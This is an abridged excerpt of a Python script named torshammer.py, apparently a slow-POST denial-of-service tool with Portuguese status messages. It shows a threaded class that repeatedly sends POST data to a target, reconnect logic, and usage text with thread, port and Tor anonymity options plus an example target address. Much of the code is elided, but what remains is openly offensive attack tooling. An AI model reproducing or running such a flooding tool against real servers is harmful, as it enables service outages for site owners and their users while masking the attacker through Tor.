...
class httpPost(Thread):
    ...
    def _send_http_post(self, pause=10):
        ...
        for i in range(0, 9999):
            ...
            print term.BOL+term.UP+term.CLEAR_EOL+"Atacando: %s" % p+term.NORMAL
            self.socks.send(p)
        ...
        while self.running:
            while self.running:
                try:
                    ...
                    print term.BOL+term.UP+term.CLEAR_EOL+"Conectado ao host..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error Connection..."+ term.NORMAL
                    time.sleep(1)
                    continue
...
def usage():
    ...
    print " -r|--threads <Numero de threads> Defaults to 256"
    print " -p|--port <Porta do Servidor> Defaults to 80"
    print " -T|--tor Ativa anonimato por meio de tor em 127.0.0.1:9050"
    print " -h|--help Mostra ajuda\n" 
    print "Ex. ./torshammer.py -t 192.168.1.100 -r 256\n"
...
if __name__ == "__main__":
    print "\n/*"
    print " *"+term.RED + " Richils "+term.NORMAL
